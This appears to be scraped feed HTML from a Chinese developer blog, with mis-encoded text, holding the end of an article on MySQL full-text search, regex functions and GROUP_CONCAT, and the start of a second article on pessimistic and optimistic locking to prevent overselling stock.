<p>è¡¨ t_articles æœ‰ 100 ä¸‡ç¯‡æ–‡ç« ã€‚éœ€æ±‚æ˜¯æœç´¢å†…å®¹ä¸­åŒ…å« "database" çš„æ–‡ç« ã€‚</p>
<p><strong>ä½æ•ˆè§£æ³•ï¼š</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> t_articles <span class="hljs-keyword">WHERE</span> content <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'%database%'</span>;
</code></pre>
<p>åŸç†åˆ†æï¼š</p>
<p>æ ‡å‡†çš„ B+ æ ‘ç´¢å¼•åªèƒ½æ”¯æŒå‰ç¼€åŒ¹é…ï¼ˆLIKE 'database%'ï¼‰ã€‚ä¸€æ—¦é€šé…ç¬¦ % å‡ºç°åœ¨å¼€å¤´ï¼Œç´¢å¼•ç«‹å³å¤±æ•ˆï¼Œæ•°æ®åº“å¿…é¡»é€è¡Œæ‰«æï¼ˆFull Table Scanï¼‰ï¼Œæ€§èƒ½å¤æ‚åº¦ä¸º <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(N)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span></span>ã€‚</p>
<p><strong>æŠ€æœ¯è§£æ³•ï¼šå€’æ’ç´¢å¼• (Inverted Index)</strong></p>
<p>MySQL InnoDB å¼•æ“æ”¯æŒ <strong>å…¨æ–‡ç´¢å¼• (Full-Text Index)</strong>ã€‚å®ƒé€šè¿‡åˆ†è¯æ„å»ºâ€œè¯ -&gt; æ–‡æ¡£IDâ€çš„å€’æ’æ˜ å°„ï¼Œå®ç° <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></span> æˆ– <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(logN)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span></span> çº§åˆ«çš„æœç´¢ã€‚</p>
<p><strong>1. åˆ›å»ºç´¢å¼•ï¼š</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> t_articles <span class="hljs-keyword">ADD</span> FULLTEXT INDEX ft_content (content);
</code></pre>
<p><strong>2. ä½¿ç”¨ MATCH ... AGAINST è¯­æ³•ï¼š</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> t_articles 
<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">MATCH</span>(content) AGAINST(<span class="hljs-string">'database'</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">NATURAL</span> <span class="hljs-keyword">LANGUAGE</span> MODE);
</code></pre>
<p><strong>å®æˆ˜æ³¨æ„ç‚¹ï¼š</strong></p>
<ul>
<li><strong>æœ€å°è¯é•¿ï¼š</strong> é»˜è®¤æƒ…å†µä¸‹ï¼Œå°‘äº 3 ä¸ªå­—ç¬¦çš„è¯ï¼ˆå¦‚ "it", "is"ï¼‰ä¼šè¢«å¿½ç•¥ã€‚å¯ä»¥é€šè¿‡ innodb_ft_min_token_size è°ƒæ•´ã€‚</li>
<li><strong>åœç”¨è¯ (Stopwords)ï¼š</strong> å¸¸è§çš„æ— æ„ä¹‰è¯æ±‡ï¼ˆ"the", "and"ï¼‰ä¼šè¢«è‡ªåŠ¨è¿‡æ»¤ã€‚</li>
<li><strong>åˆ†è¯å™¨ï¼š</strong> å¯¹äºä¸­æ–‡æœç´¢ï¼Œå¿…é¡»ä½¿ç”¨ ngram åˆ†è¯å™¨ï¼ˆWITH PARSER ngramï¼‰ï¼Œå¦åˆ™æ— æ³•æ­£ç¡®åˆ‡åˆ†ä¸­æ–‡è¯ç»„ã€‚</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9688c18513b549de9cfa9e74b6fb2573~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pWw5o2u5bCP6aaS5aS0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768507455&amp;x-signature=tc%2FIK1qTxdWSzo9u%2Fdd3spveFxw%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">äºŒã€ SQL é‡Œçš„ç‘å£«å†›åˆ€ï¼šæ­£åˆ™è¡¨è¾¾å¼ (RegExp)</h2>
<p>åœºæ™¯å¤ç°ï¼š</p>
<p>æ•°æ®è¡¨ä¸­æ··å…¥äº†è„æ•°æ®ï¼Œéœ€è¦æ‰¾å‡ºæ‰€æœ‰â€œéæ³•çš„é‚®ç®±åœ°å€â€è¿›è¡Œæ ‡è®°ï¼›æˆ–è€…éœ€è¦å°†æ‰‹æœºå·çš„ä¸­é—´å››ä½è„±æ•ä¸º ****ã€‚</p>
<p>ä½æ•ˆè§£æ³•ï¼š</p>
<p>LIKE åªèƒ½åšç®€å•çš„é€šé…ï¼Œæ— æ³•è¡¨è¾¾â€œæ•°å­—å‡ºç°3æ¬¡â€è¿™ç§é€»è¾‘ã€‚é€šå¸¸åšæ³•æ˜¯å†™è„šæœ¬æŠŠæ•°æ® Select å‡ºæ¥ï¼Œç”¨ä»£ç é‡Œçš„æ­£åˆ™åº“å¤„ç†å®Œå† Update å›å»ã€‚</p>
<p><strong>æŠ€æœ¯è§£æ³•ï¼šMySQL 8.0 çš„æ­£åˆ™å‡½æ•°æ—</strong></p>
<p>MySQL 8.0 å¼•å…¥äº†åŸºäº ICU åº“çš„å®Œæ•´æ­£åˆ™æ”¯æŒï¼ˆä¹‹å‰ç‰ˆæœ¬ä»…æ”¯æŒç®€å•çš„ REGEXP åŒ¹é…ï¼‰ã€‚</p>
<p><strong>1. æŸ¥æ‰¾è„æ•°æ® (REGEXP)ï¼š</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- æŸ¥æ‰¾ä¸åŒ…å« @ ç¬¦å·ï¼Œæˆ–è€…ä¸ä»¥ .com/.net ç­‰ç»“å°¾çš„é‚®ç®±</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> t_users 
<span class="hljs-keyword">WHERE</span> email <span class="hljs-keyword">NOT</span> REGEXP <span class="hljs-string">'^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$'</span>;
</code></pre>
<p>2. æå–æ•°æ® (REGEXP_SUBSTR)ï¼š</p>
<p>ä»å¤æ‚çš„ JSON å­—ç¬¦ä¸²æˆ–æ—¥å¿—æ–‡æœ¬ä¸­æå–ç‰¹å®š IDï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- æå– "Order ID: 12345 Created" ä¸­çš„æ•°å­—</span>
<span class="hljs-keyword">SELECT</span> REGEXP_SUBSTR(log_content, <span class="hljs-string">'[0-9]+'</span>) <span class="hljs-keyword">FROM</span> t_logs;
</code></pre>
<p>3. æ•°æ®æ¸…æ´—ä¸è„±æ• (REGEXP_REPLACE) â€”â€” æ€æ‰‹çº§åŠŸèƒ½ï¼š</p>
<p>ç›´æ¥åœ¨ SQL å±‚å®Œæˆè„±æ•ï¼Œæ— éœ€åº”ç”¨å±‚ä»‹å…¥ã€‚</p>
<pre><code class="hljs language-scss" lang="scss">-- å°†æ‰‹æœºå· <span class="hljs-number">13812345678</span> æ›¿æ¢ä¸º <span class="hljs-number">138</span>****<span class="hljs-number">5678</span>
-- é€»è¾‘ï¼šæ•è·å‰<span class="hljs-number">3</span>ä½($<span class="hljs-number">1</span>)ï¼Œå¿½ç•¥ä¸­é—´<span class="hljs-number">4</span>ä½ï¼Œæ•è·å<span class="hljs-number">4</span>ä½($<span class="hljs-number">2</span>)ï¼Œé‡æ–°æ‹¼æ¥
UPDATE t_users 
SET phone = <span class="hljs-built_in">REGEXP_REPLACE</span>(phone, '^([<span class="hljs-number">0</span>-<span class="hljs-number">9</span>]{<span class="hljs-number">3</span>})<span class="hljs-selector-attr">[0-9]</span>{<span class="hljs-number">4</span>}([<span class="hljs-number">0</span>-<span class="hljs-number">9</span>]{<span class="hljs-number">4</span>})$', '$<span class="hljs-number">1</span>****$<span class="hljs-number">2</span>');
</code></pre>
<h2 data-id="heading-2">ä¸‰ã€ è¡Œè½¬åˆ—åˆ©å™¨ï¼šGROUP_CONCAT çš„é™·é˜±ä¸ä¼˜åŒ–</h2>
<p>åœºæ™¯å¤ç°ï¼š</p>
<p>ç”¨æˆ·è¡¨ t_users å’Œ æ ‡ç­¾è¡¨ t_tags æ˜¯å¤šå¯¹å¤šå…³ç³»ã€‚</p>
<p>å‰ç«¯ API éœ€è¦è¿”å›å¦‚ä¸‹æ ¼å¼ï¼š</p>
<p>{ "user_id": 1, "tags": "Developer, Admin, VIP" }</p>
<p>ä½æ•ˆè§£æ³•ï¼š</p>
<p>å…ˆæŸ¥ç”¨æˆ·ï¼Œå†å¾ªç¯æŸ¥æ ‡ç­¾ï¼ˆN+1 æŸ¥è¯¢ï¼‰ï¼›æˆ–è€…æŸ¥å‡ºæ‰€æœ‰å…³è”æ•°æ®ï¼Œåœ¨åº”ç”¨å±‚åš Map èšåˆã€‚</p>
<p><strong>æŠ€æœ¯è§£æ³•ï¼šGROUP_CONCAT</strong></p>
<p>MySQL æä¾›äº†ä¸€ä¸ªèšåˆå‡½æ•°ï¼Œä¸“é—¨ç”¨äºå°†â€œå¤šè¡Œæ•°æ®â€åˆå¹¶ä¸ºâ€œä¸€è¡Œå­—ç¬¦ä¸²â€ã€‚</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-keyword">SELECT</span> 
    u.id, 
    u.username,
    -- å°†è¯¥ç”¨æˆ·çš„æ‰€æœ‰ tag_name ç”¨é€—å·è¿æ¥
    GROUP_CONCAT(t.tag_name <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> t.id DESC SEPARATOR <span class="hljs-comment">', ') as tags</span>
<span class="hljs-keyword">FROM</span> t_users u
<span class="hljs-keyword">JOIN</span> t_user_tags ut <span class="hljs-keyword">ON</span> u.id = ut.user_id
<span class="hljs-keyword">JOIN</span> t_tags t <span class="hljs-keyword">ON</span> ut.tag_id = t.id
<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> u.id;
</code></pre>
<p><strong>âš ï¸ è‡´å‘½é™·é˜±ï¼šé»˜è®¤é•¿åº¦é™åˆ¶</strong></p>
<p>å¾ˆå¤šå¼€å‘è€…åœ¨å¼€å‘ç¯å¢ƒæµ‹è¯•æ²¡é—®é¢˜ï¼Œä¸€ä¸Šç”Ÿäº§ç¯å¢ƒå‘ç°æ ‡ç­¾è¢«æˆªæ–­äº†ã€‚</p>
<p>è¿™æ˜¯å› ä¸º MySQL å¯¹ GROUP_CONCAT çš„ç»“æœé•¿åº¦æœ‰é™åˆ¶ï¼Œç”±ç³»ç»Ÿå˜é‡ group_concat_max_len æ§åˆ¶ã€‚</p>
<ul>
<li><strong>é»˜è®¤å€¼ï¼š</strong> ä»… <strong>1024 å­—èŠ‚</strong>ã€‚å¦‚æœåˆå¹¶åçš„å­—ç¬¦ä¸²è¶…è¿‡ 1KBï¼Œä¼šè¢«é™é»˜æˆªæ–­ï¼Œä¸”<strong>ä¸ä¼šæŠ¥é”™</strong>ã€‚</li>
</ul>
<p>è§£å†³æ–¹æ¡ˆï¼š</p>
<p>åœ¨æ‰§è¡Œ SQL å‰ï¼Œæˆ–è€…åœ¨ Session çº§åˆ«è°ƒå¤§è¯¥å‚æ•°ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">SET SESSION <span class="hljs-attr">group_concat_max_len</span> = <span class="hljs-number">102400</span><span class="hljs-comment">; -- è®¾ç½®ä¸º 100KB</span>
SELECT ...
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c199cb2df7124b55ae158a7db366e624~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pWw5o2u5bCP6aaS5aS0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768507455&amp;x-signature=BT8shMIiv6DKflecXDXAeK%2BGVj4%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-3">æ€»ç»“</h2>
<p>æ•°æ®åº“ä¸ä»…ä»…æ˜¯å­˜å‚¨å¼•æ“ï¼Œå®ƒåŒæ ·å…·å¤‡å¼ºå¤§çš„è®¡ç®—å’Œå¤„ç†èƒ½åŠ›ã€‚</p>
<ol>
<li><strong>æœç´¢ï¼š</strong> é‡åˆ°æ¨¡ç³ŠåŒ¹é…ï¼Œåˆ«æ— è„‘ LIKEã€‚å¦‚æœæ•°æ®é‡å¤§ä¸”éœ€è¦è‡ªç„¶è¯­è¨€å¤„ç†ï¼Œè¯·å¯ç”¨ <strong>Full-Text Index</strong>ã€‚</li>
<li><strong>æ¸…æ´—ï¼š</strong> å–„ç”¨ MySQL 8.0 çš„ <strong>REGEXP_REPLACE</strong>ï¼Œå®ƒèƒ½è®©ä½ ç”¨ä¸€å¥ SQL å®Œæˆç™¾ä¸‡çº§æ•°æ®çš„æ¸…æ´—å’Œè„±æ•ï¼Œæ•ˆç‡è¿œè¶… Python è„šæœ¬ã€‚</li>
<li><strong>èšåˆï¼š</strong> ä½¿ç”¨ <strong>GROUP_CONCAT</strong> ç®€åŒ–â€œä¸€å¯¹å¤šâ€æŸ¥è¯¢ï¼Œä½†æ°¸è¿œä¸è¦å¿˜è®°æ£€æŸ¥ group_concat_max_len å‚æ•°ã€‚</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MySQLå¹¶å‘ä¸é”ï¼šä»â€œé˜²æ­¢è¶…å–â€åˆ°æ’æŸ¥â€œæ­»é”â€]]></title>    <link>https://juejin.cn/post/7592819937652637711</link>    <guid>https://juejin.cn/post/7592819937652637711</guid>    <pubDate>2026-01-08T19:58:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592819937652637711" data-draft-id="7592819937652621327" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MySQLå¹¶å‘ä¸é”ï¼šä»â€œé˜²æ­¢è¶…å–â€åˆ°æ’æŸ¥â€œæ­»é”â€ "/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-08T19:58:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ•°æ®å°é¦’å¤´"/> <meta itemprop="url" content="https://juejin.cn/user/48851852475720"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MySQLå¹¶å‘ä¸é”ï¼šä»â€œé˜²æ­¢è¶…å–â€åˆ°æ’æŸ¥â€œæ­»é”â€ 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/48851852475720/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ•°æ®å°é¦’å¤´
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T19:58:29.000Z" title="Thu Jan 08 2026 19:58:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ç”µå•†æˆ–é‡‘èç³»ç»Ÿä¸­ï¼Œ<strong>å¹¶å‘æ§åˆ¶</strong>æ˜¯æœ€æ ¸å¿ƒçš„æŒ‘æˆ˜ä¹‹ä¸€ã€‚</p>
<p>å¾ˆå¤šå¼€å‘è€…åœ¨å†™â€œæ‰£å‡åº“å­˜â€é€»è¾‘æ—¶ï¼Œä¹ æƒ¯å†™å‡ºè¿™æ ·çš„ä»£ç ï¼š</p>
<ol>
<li>æŸ¥è¯¢å½“å‰åº“å­˜ï¼šSELECT stock FROM products WHERE id = 1;</li>
<li>åº”ç”¨å±‚åˆ¤æ–­ï¼šif (stock &gt; 0)</li>
<li>æ›´æ–°åº“å­˜ï¼šUPDATE products SET stock = stock - 1 WHERE id = 1;</li>
</ol>
<p>åœ¨ä½å¹¶å‘ä¸‹è¿™æ²¡é—®é¢˜ã€‚ä½†åœ¨é«˜å¹¶å‘åœºæ™¯ä¸‹ï¼Œä¸¤ä¸ªçº¿ç¨‹å¯èƒ½åŒæ—¶è¯»åˆ° stock=1ï¼ŒåŒæ—¶é€šè¿‡æ ¡éªŒï¼Œåˆ†åˆ«æ‰§è¡Œ UPDATEã€‚ç»“æœæ˜¯ï¼šå–å‡ºäº†ä¸¤ä»¶å•†å“ï¼Œåº“å­˜å˜æˆäº† -1ã€‚</p>
<p>è¿™å°±æ˜¯å…¸å‹çš„<strong>ç«æ€æ¡ä»¶</strong>ã€‚è§£å†³è¿™ä¸ªé—®é¢˜çš„ç»ˆææˆ˜åœºä¸åœ¨åº”ç”¨å±‚ï¼Œè€Œåœ¨æ•°æ®åº“å±‚ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7f10f5cd9622455dac57bcfa2ad03e30~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pWw5o2u5bCP6aaS5aS0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768507109&amp;x-signature=gKB4v5HANGrXk4BPbdj05OTVuy8%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">ä¸€ã€ æ‚²è§‚é” vs ä¹è§‚é”ï¼šå¦‚ä½•å®‰å…¨åœ°æ‰£å‡åº“å­˜ï¼Ÿ</h2>
<h2 data-id="heading-1">1. æ‚²è§‚é” (Pessimistic Locking)ï¼šSELECT ... FOR UPDATE</h2>
<p>æ‚²è§‚é”çš„æ ¸å¿ƒæ€æƒ³æ˜¯ï¼šâ€œæ€»æœ‰äººæƒ³è·Ÿæˆ‘æŠ¢ï¼Œæˆ‘å…ˆé”ä½å†è¯´ã€‚â€</p>
<p>åœ¨ MySQL InnoDB ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ FOR UPDATE æ˜¾å¼æ·»åŠ <strong>æ’ä»–é” (X Lock)</strong>ã€‚</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">START</span> TRANSACTION;

<span class="hljs-comment">-- 1. æ˜¾å¼åŠ é”ã€‚æ­¤æ—¶å…¶ä»–äº‹åŠ¡å¦‚æœæƒ³æŸ¥æˆ–æ”¹è¿™è¡Œæ•°æ®ï¼Œå¿…é¡»ç­‰å¾…</span>
<span class="hljs-keyword">SELECT</span> stock <span class="hljs-keyword">FROM</span> products <span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-keyword">FOR</span> <span class="hljs-keyword">UPDATE</span>;

<span class="hljs-comment">-- 2. åªæœ‰æ‹¿åˆ°é”çš„äº‹åŠ¡æ‰èƒ½æ‰§è¡Œåç»­é€»è¾‘</span>
<span class="hljs-comment">-- (åº”ç”¨å±‚åˆ¤æ–­ stock &gt; 0)</span>
<span class="hljs-keyword">UPDATE</span> products <span class="hljs-keyword">SET</span> stock <span class="hljs-operator">=</span> stock <span class="hljs-operator">-</span> <span class="hljs-number">1</span> <span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;

<span class="hljs-keyword">COMMIT</span>;
</code></pre>
<p>ä¼˜ç‚¹ï¼š å¼ºä¸€è‡´æ€§ï¼Œå®Œå…¨é¿å…è¶…å–ã€‚</p>
<p>ç¼ºç‚¹ï¼š æ€§èƒ½å¼€é”€å¤§ã€‚é”çš„æŒæœ‰æ—¶é—´ = äº‹åŠ¡æ‰§è¡Œæ—¶é—´ã€‚åœ¨é«˜å¹¶å‘ä¸‹ï¼Œä¼šé€ æˆå¤§é‡è¯·æ±‚é˜»å¡ï¼Œç”šè‡³è¶…æ—¶ã€‚</p>
<p>é€‚ç”¨åœºæ™¯ï¼š å†™å…¥é¢‘ç¹ã€å¼ºä¸€è‡´æ€§è¦æ±‚æé«˜ã€å¹¶å‘é‡é€‚ä¸­çš„åœºæ™¯ï¼ˆå¦‚è½¬è´¦ï¼‰ã€‚</p>
<h2 data-id="heading-2">2. ä¹è§‚é” (Optimistic Locking)ï¼šåŸºäº CAS (Compare-and-Swap)</h2>
<p>ä¹è§‚é”çš„æ ¸å¿ƒæ€æƒ³æ˜¯ï¼šâ€œå¤§å®¶éšä¾¿æ‹¿ï¼Œä½†æˆ‘æ›´æ–°æ—¶è¦æ£€æŸ¥ä¸€ä¸‹æ•°æ®æœ‰æ²¡æœ‰å˜ã€‚â€</p>
<p>è¿™ä¸éœ€è¦æ•°æ®åº“æ˜¾å¼åŠ é”ï¼Œè€Œæ˜¯é€šè¿‡ç‰ˆæœ¬å· (version) æœºåˆ¶åœ¨ SQL å±‚é¢å®ç°ã€‚</p>
<p>æˆ‘ä»¬éœ€è¦åœ¨è¡¨ä¸­å¢åŠ ä¸€ä¸ª version å­—æ®µã€‚</p>
<pre><code class="hljs language-ini" lang="ini">-- 1. æŸ¥è¯¢æ•°æ®ï¼ŒåŒæ—¶æ‹¿åˆ°ç‰ˆæœ¬å· (å‡è®¾ <span class="hljs-attr">version</span> = <span class="hljs-number">10</span>)
SELECT stock, version FROM products WHERE <span class="hljs-attr">id</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span>

-- 2. æ›´æ–°æ—¶ï¼Œæ ¡éªŒç‰ˆæœ¬å·æ˜¯å¦ä¾ç„¶æ˜¯ 10
UPDATE products 
SET <span class="hljs-attr">stock</span> = stock - <span class="hljs-number">1</span>, version = version + <span class="hljs-number">1</span> 
WHERE <span class="hljs-attr">id</span> = <span class="hljs-number">1</span> AND version = <span class="hljs-number">10</span><span class="hljs-comment">;</span>
</code></pre>
<p>é€»è¾‘è§£æï¼š</p>
<p>å¦‚æœ SQL è¿”å› Affected rows: 1ï¼Œè¯´æ˜æ‰£å‡æˆåŠŸã€‚</p>
